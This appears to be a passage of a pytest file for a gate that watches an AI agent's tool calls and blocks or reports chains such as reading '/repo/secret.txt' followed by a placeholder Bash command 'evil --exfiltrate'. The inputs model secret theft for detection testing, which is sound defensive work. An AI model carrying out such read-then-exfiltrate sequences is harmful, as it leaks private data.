    (operator / "chain.yaml").write_text(CHAIN_RULE, encoding="utf-8")

    searched = []
    real = gate._sequence_module

    def spy():
        module = real()
        searched.append(module)
        return module

    monkeypatch.setattr(gate, "_sequence_module", spy)

    # Two reads: neither is a `command.exec`, so neither can be the final step.
    gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="sess-pre", record=False
    )
    gate.evaluate_tool_call(
        "Read", {"file_path": "/repo/secret.txt"}, session_id="sess-pre", record=False
    )
    assert searched == [], "the chain evaluator was loaded for a call that cannot complete a chain"

    # The command CAN be the final step, so the search runs and the chain fires.
    decision = gate.evaluate_tool_call(
        "Bash", {"command": "evil --now"}, session_id="sess-pre", record=False
    )
    assert searched, "the chain evaluator was skipped for a call that completes a chain"
    assert decision.allowed is False


def test_a_completed_chain_is_reported_once_not_on_every_later_call(packs, findings_db):
    """The window keeps sliding forward, so the same chain keeps matching. Only
    the call that COMPLETED it is a new observation; re-reporting on every
    subsequent tool call would bury the live signal."""
    detect, _operator = packs
    (detect / "chain.yaml").write_text(
        CHAIN_RULE.replace("enforce: true", "enforce: false"), encoding="utf-8"
    )

    gate.evaluate_tool_call("Read", {"file_path": "/repo/secret.txt"}, session_id="sess-once")
    completing = gate.evaluate_tool_call(
        "Bash", {"command": "evil --exfiltrate"}, session_id="sess-once"
    )
    assert [m["rule_id"] for m in completing.matches] == ["chains.canary"]

    for _ in range(3):
        later = gate.evaluate_tool_call("Bash", {"command": "ls"}, session_id="sess-once")
        assert later.matches == (), "the chain was re-reported on a later, unrelated call"

    assert len(_rows(findings_db)) == 1
